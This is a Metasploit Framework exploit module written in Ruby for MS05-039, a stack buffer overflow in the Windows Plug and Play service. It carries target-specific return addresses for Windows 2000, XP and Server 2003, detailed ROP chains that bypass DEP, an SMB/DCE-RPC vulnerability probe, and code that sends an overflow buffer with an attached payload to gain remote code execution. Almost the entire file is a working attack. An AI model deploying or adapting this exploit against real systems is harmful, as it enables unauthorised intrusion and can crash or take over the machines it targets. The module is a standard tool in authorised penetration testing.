##
# $Id: ms05_039_pnp.rb 10190 2010-08-30 20:40:05Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::DCERPC
	include Msf::Exploit::Remote::SMB


	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Plug and Play Service Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in the Windows Plug
				and Play service. This vulnerability can be exploited on
				Windows 2000 without a valid user account.

				NOTE: Since the PnP service runs inside the service.exe process, a failed
				exploit attempt will cause the system to automatically reboot.
			},
			'Author'         => [ 'hdm', 'cazz' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10190 $',
			'References'     =>
				[
					[ 'CVE', '2005-1983' ],
					[ 'OSVDB', '18605' ],
					[ 'BID', '14513' ],
					[ 'MSB', 'MS05-039' ],
					[ 'URL', 'http://www.hsc.fr/ressources/presentations/null_sessions/' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "\x00",
					'Compat'   =>
						{
							# -ws2ord XXX?
						},
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[
						'Windows 2000 SP0-SP4', # Tested OK - 11/25/2005 hdm
						{
							'Ret'      => 0x767a38f6, # umpnpmgr.dll
						},
					],
					[
						'Windows 2000 SP4 French',
						{
							'Ret'      => 0x767438f6, # French target by ExaProbe <fmourron@exaprobe.com>
						},
					],
					[
						'Windows 2000 SP4 Spanish',
						{
							'Ret'      => 0x767738f6, # umpnpmgr.dll
						},
					],
					[
						'Windows 2000 SP4 English/French/German/Dutch',
						{
							'Ret'      => 0x01013C79, # [Pita] [Houmous] <pita@mail.com>
						},
					],
					[
						'Windows 2000 SP0-SP4 German',
						{
							'Ret'      => 0x767338f6, # German target by Michael Thumann <mthumann@ernw.de>
						},
					],
					[
						'Windows 2000 SP0-SP4 Italian',
						{
							'Ret'      => 0x7677366f, # acaro <acaro@jervus.it>
						},
					],
					[
						'Windows XP SP1 English',
						{
							'Ret'      => 0x758c572a, # pop edi / pop ebx / ret in umpnpmgr.dll v5.1.2600.1106
							'Pipe'     => 'ntsvcs',
							'Offset'   => 16,
						}
					],
					# NOTE: XP SP2, Server 2003 (and SP1) require an Administrator account to access
					# the vulnerable functionality.
					[
						'Windows XP SP2 English (Requires Admin)',
						# SafeSEH enabled, DEP AlwaysOn
						{
							#'Ret'       => 0x41424344,
							'Ret'       => 0x758d2bb3,  # pop eax / ret 0x8
							'Pipe'      => 'ntsvcs',
							'PtrToZero' => 0x758c0170,  # PE data of umpnpmgr.dll v5.1.2600.2180
							'Offset'    => 72,
							'EspOffset' => 108,
							'RopStack'  =>
								# All addresses are from umpnpmgr.dll v5.2.3790.1830
								[
									#
									# Step 1. Allocate an executable heap with HeapCreate
									#
									# Resolve HeapCreate from import
									0x758c1148,            # pointer to HeapCreate import
									0x758c2950,            # mov eax, [eax] / pop ebp / ret 0x8
									0x41414141,            # scratch
									0x41414141,            # scratch
									#0x758da008,            # becomes ebp (something writable)
									0x758da1c8-0xc,        # becomes ebp (writable, used later)

									# Call HeapCreate
									0x758cb728,            # call eax / mov [ebp+0xc],eax / jmp... / mov eax,[ebp+0xc] / pop edi,esi,ebx,ebp / ret 0xc
									0x41414141,            # scratch
									0x41414141,            # scratch
									0x01040110,            # flOptions (gets & with 0x40005)
									0x01010101,
									0x01010101,
									0x758ce552,            # becomes edi - pop edi,esi / ret
									0x758cdd7e,            # becomes esi - pop esi,ebx,ebp / ret 0x4
									0x41414141,            # becomes ebx
									0x41414141,            # becomes ebp

									# Don't bother calling HeapAlloc, just add 0x8000 to the Heap Base
									0x758d45f3,            # or eax,0x8000 / pop ebp / ret 0x4
									0x41414141,            # scratch
									0x41414141,            # scratch
									0x41414141,            # scratch
									0x41414141,            # becomes ebp

									# save eax to ebx
									0x758ce0d5,            # push eax / call esi
									0x41414141,            # scratch
									0x758da008+0x18,       # becomes ebp

									# Setup eax to load our saved stack pointer
									0x758d18db,            # pop eax / ret 0xc
									0x41414141,            # scratch
									0x758c524e,            # becomes eax - pop ebp / ret 0x8
									#0x758c2423,            # becomes eax - pop esi,ebp / ret 0x8

									# Store a pointer to the stack to a known address (ebp-0x18), flows to eax after
									0x758c1281,            # mov [ebp-0x18],esp / push eax / mov eax,[ebp-4] / mov [ebp-4],0xffffffff / mov [ebp-8],eax / lea eax,[ebp-0x10] / mov fs:[0],eax / ret
									0x41414141,            # scratch
									0x41414141,            # scratch
									0x41414141,            # scratch
									#0xcafebabe,            # becomes esi
									0x758da008-0x10,       # becomes ebp

									# Call lstrcpyW to copy shellcode into executable heap
									0x758c542e,            # push [ebp+0x10] / push ebx / call lstrcpyW / push ebx / call edi
									0x41414141,            # scratch
									0x41414141,            # scratch

									# Skip the junk
									0x758c96f6,            # add al,0x3b / ret

									# Call the executable segment!
									0x758c3b62             # call eax
								]
						}
					],
					[
						'Windows Server 2003 SP0 English (Requires Admin)',
						# SafeSEH unsupported, DEP unsupported
						{
							'Ret'       => 0x780df756, # push esp / ret in msvcp60.dll
							'Pipe'      => 'ntsvcs',
							'PtrToZero' => 0x757702c0, # PE data of umpnpmgr.dll
							'Offset'    => 72,
						}
					],
					[
						'Windows Server 2003 SP1 English (Requires Admin)',
						# SafeSEH enabled, DEP AlwaysOn
						{
							'Pipe'      => 'ntsvcs',
							# We will need to bypass DEP!
							#'Ret'       => 0x41424344,
							'Ret'       => 0x757873d5,  # pop eax / ret 0x4
							'PtrToZero' => 0x757702c0,  # PE data of umpnpmgr.dll
							'Offset'    => 72,          # offset to saved eip
							'EspOffset' => 108,         # Offset to where esp ends up pointing
							'RopStack'  =>              # NOTE: 0x41414141 will become random data
								# All addresses are from umpnpmgr.dll v5.2.3790.1830
								[
									#
									# Step 1. Allocate an executable heap with HeapCreate
									#
									# Resolve HeapCreate from import
									0x75771144,            # pointer to HeapCreate import
									0x75772e68,            # mov eax, [eax] / pop ebp / ret
									0x41414141,            # scratch
									0x41414141,            # becomes ebp
									# Call HeapCreate
									0x7578bc37,            # jmp eax
									0x41414141,            # scratch
									0x41414141,            # scratch
									# Save the new heap address in edi
									0x757791d5,            # xchg eax,edi / cmp bh,0xff / ret 0x10
									0x01040110,            # flOptions (gets & with 0x40005)
									0x01010101,
									0x01010101,

									#
									# Step 2. Allocate a buffer using this new heap.
									#
									0x757873d5,            # pop eax / ret 0x4
									0x41414141,            # scratch
									0x41414141,            # scratch
									0x41414141,            # scratch
									0x41414141,            # scratch
									# Resolve HeapAlloc from import
									0x7577115c,            # pointer to HeapAlloc import
									0x75772e68,            # mov eax, [eax] / pop ebp / ret
									0x41414141,            # scratch
									0x41414141,            # becomes ebp
									# Save the address of HeapAlloc in esi
									0x75777ae0,            # xchg eax,esi / mov dl,0xff / dec ecx / ret
									0x41414141,            # scratch
									0x41414141,            # scratch
									# Call HeapAlloc
									0x7578bb6b,            # push edi / call esi / pop edi,esi,ebp / ret
									0xffffffff,            # flags
									0x00010001,            # allocation size
									0x0101018d,            # becomes edi / first byte stored
									0x7577835c,            # becomes esi - pop esi / pop ebx / ret
									0x757830c3,            # becomes ebp/eip - pop esi / ret

									#
									# Step 3. Save the heap address into ebx
									#
									0x7578308f,            # push eax / mov [0x7578d8e0],edi / mov [0x7578d39c],edi / call esi
									0x41414141,            # scratch
									# Put heap address in edi
									0x757791d5,            # xchg eax,edi / cmp bh,0xff / ret 0x10

									#
									# Step 4. Write stub:
									#
									# metasm > lea esi,[esp+4]; _start: lodsb; test al,al; jz _out; stosb; _end: jmp _start; _out:
									# "\x8d\x74\x24\x04\xac\x84\xc0\x74\x03\xaa\xeb\xf8"
									#
									# Store the first byte.
									0x7578be14,            # stosb / ret
									0x41414141,            # scratch
									0x41414141,            # scratch
									0x41414141,            # scratch
									0x41414141,            # scratch
									# Store another byte!
									0x757873d5,            # pop eax / ret 0x4
									0x01010174,            # next byte to write
									0x7578be14,            # stosb / ret
									0x41414141,            # scratch
									# Store another byte!
									0x757873d5,            # pop eax / ret 0x4
									0x01010124,            # next byte to write
									0x7578be14,            # stosb / ret
									0x41414141,            # scratch
									# Store another byte!
									0x757873d5,            # pop eax / ret 0x4
									0x01010104,            # next byte to write
									0x7578be14,            # stosb / ret
									0x41414141,            # scratch
									# Store another byte!
									0x757873d5,            # pop eax / ret 0x4
									0x010101ac,            # next byte to write
									0x7578be14,            # stosb / ret
									0x41414141,            # scratch
									# Store another byte!
									0x757873d5,            # pop eax / ret 0x4
									0x01010184,            # next byte to write
									0x7578be14,            # stosb / ret
									0x41414141,            # scratch
									# Store another byte!
									0x757873d5,            # pop eax / ret 0x4
									0x010101c0,            # next byte to write
									0x7578be14,            # stosb / ret
									0x41414141,            # scratch
									# Store another byte!
									0x757873d5,            # pop eax / ret 0x4
									0x01010174,            # next byte to write
									0x7578be14,            # stosb / ret
									0x41414141,            # scratch
									# Store another byte!
									0x757873d5,            # pop eax / ret 0x4
									0x01010103,            # next byte to write
									0x7578be14,            # stosb / ret
									0x41414141,            # scratch
									# Store another byte!
									0x757873d5,            # pop eax / ret 0x4
									0x010101aa,            # next byte to write
									0x7578be14,            # stosb / ret
									0x41414141,            # scratch
									# Store another byte!
									0x757873d5,            # pop eax / ret 0x4
									0x010101eb,            # next byte to write
									0x7578be14,            # stosb / ret
									0x41414141,            # scratch
									# Store another byte!
									0x757873d5,            # pop eax / ret 0x4
									0x010101f8,            # next byte to write
									0x7578be14,            # stosb / ret
									0x41414141,            # scratch

									#
									# Step 5. Finally, call our executable heap buffer.
									#
									0x75783efe             # call ebx
								]
						}
					]
				],
			'DefaultTarget' => 0,
			'DisclosureDate' => 'Aug 9 2005'))

		register_options(
			[
				OptString.new('SMBPIPE', [ true,  "The pipe name to use (browser, srvsvc, wkssvc, ntsvcs)", 'browser']),
			], self.class)

	end

	def pnp_probe(req, pipe = datastore['SMBPIPE'])

		print_status("Connecting to the SMB service...")
		begin
			connect()
			smb_login()
		rescue ::Exception => e
			print_error("Error: #{e.class} #{e}")
		end

		handle = dcerpc_handle('8d9f4e40-a03d-11ce-8f69-08003e30051b', '1.0', 'ncacn_np', ["\\#{pipe}"])
		print_status("Binding to #{handle} ...")
		dcerpc_bind(handle)
		print_status("Bound to #{handle} ...")

		# CS_DES
		cs_des =
			NDR.long(0) + # CSD_SignatureLength
			NDR.long(0) + # CSD_LegacyDataOffset
			NDR.long(req.length) + # CSD_LegacyDataSize
			NDR.long(0) + # CSD_Flags
			rand_text(16) + # GUID
			req # CSD_LegacyData

		# PNP_QueryResConfList(L"a\\b\\c", 0xffff, (char *)pClassResource, 1000, foo, 4, 0);

		# ResourceName:
		stubdata =
			NDR.UnicodeConformantVaryingString("a\\b\\c") +  # ResourceName, passes both IsLegalDeviceId and IsRootDeviceID
			NDR.long(0xffff) +                               # ResourceID: ResType_ClassSpecific
			NDR.UniConformantArray(cs_des) +                 # Resource (our CS_DES structure)
			NDR.long(cs_des.length) +                        # ResourceLen
			NDR.long(4) +                                    # OutputLen (at least 4)
			NDR.long(0)                                      # Flags

		print_status("Calling the vulnerable function...")

		begin
			dcerpc.call(0x36, stubdata)
		rescue Rex::Proto::DCERPC::Exceptions::NoResponse
			print_status('Server did not respond, this is expected')
		rescue => e
			if e.to_s =~ /STATUS_PIPE_DISCONNECTED/
				print_status('Server disconnected, this is expected')
			else
				raise e
			end
		end

		# Cleanup
		disconnect

		if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil and
				dcerpc.last_response.stub_data == "\x04\x00\x00\x00\x00\x00\x00\x00\x1a\x00\x00\x00")
			return true
		else
			return false
		end
	end

	def check
		if (pnp_probe('A'))
			return Exploit::CheckCode::Vulnerable
		end
		return Exploit::CheckCode::Safe
	end

	def exploit
		# If PtrToZero is set, we use saved-ret-overwrite instead of SEH.
		if target['PtrToZero'] then
			eip_off = target['Offset']
			nul_off = eip_off + 8

			# DEP Bypass version (2003 SP1)
			if target['RopStack']
				esp_off = target['EspOffset']

				# Start with a randomized base buffer
				rop_length = target['RopStack'].length * 4
				print_status("ROP Data is %u bytes" % rop_length)
				buf = rand_text(esp_off + rop_length)

				# Put the rest of the stack data at where esp ends up...
				target['RopStack'].each_with_index { |el,idx|
					if el != 0x41414141
						buf[esp_off + (idx*4), 4] = [el].pack('V')
					end
				}
			else
				# Start with a randomized base buffer
				buf = rand_text(nul_off)
			end

			# This becomes EIP
			buf[eip_off,4] = [target.ret].pack('V')

			# Pointer to NULL (4 zero bytes)
			buf[nul_off,4] = [target['PtrToZero']].pack('V')
		else
			# Pad the string up to reach our SEH frame
			buf = rand_text(target['Offset'] ? target['Offset'] : 56)

			# Jump over the address and our invalid pointer to the payload
			buf << Rex::Arch::X86.jmp_short('$+32')
			buf << rand_text(2)

			# The SEH handler pointer
			buf << [target.ret].pack('V')

			# Some padding to reach the next pointer
			buf << rand_text(20)

			# ResourceName - cause access violation on RtlInitUnicodeString
			buf << rand_text(3) + "\xff"
		end

		# Append the encoded payload and we are good to go!
		buf << payload.encoded

		# Determine which pipe to use
		pipe = target['Pipe'] ? target['Pipe'] :  datastore['SMBPIPE']

		pnp_probe(buf, pipe)

		print_status('The server should have executed our payload')

		handler
	end

end
